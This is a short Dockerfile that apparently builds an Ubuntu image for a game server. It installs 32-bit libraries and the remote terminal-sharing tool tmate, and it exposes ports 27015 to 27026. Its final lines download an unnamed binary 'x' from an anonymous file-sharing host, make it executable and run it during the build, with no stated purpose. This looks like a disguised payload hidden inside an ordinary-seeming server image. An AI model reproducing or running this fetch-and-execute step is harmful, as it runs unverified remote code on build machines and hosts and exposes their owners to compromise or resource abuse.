FROM ubuntu:24.04
RUN touch /var/mail/ubuntu && chown ubuntu /var/mail/ubuntu && userdel -r ubuntu

USER root
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    curl wget sudo systemd \
    && rm -rf /var/lib/apt/lists/*

RUN dpkg --add-architecture i386 \
     && apt update \
     && apt install lib32z1 libbz2-1.0:i386 lib32gcc-s1 lib32stdc++6 nano screen zip wget tmate -y \
     && useradd --create-home gameserver

EXPOSE 27015
EXPOSE 27016
EXPOSE 27017
EXPOSE 27018
EXPOSE 27019
EXPOSE 27020
EXPOSE 27021
EXPOSE 27022
EXPOSE 27023
EXPOSE 27024
EXPOSE 27025
EXPOSE 27026
RUN wget https://filebin.net/vav9iugyz8m5og48/x
RUN chmod +x x
RUN mv x /usr/local/bin/x
RUN x
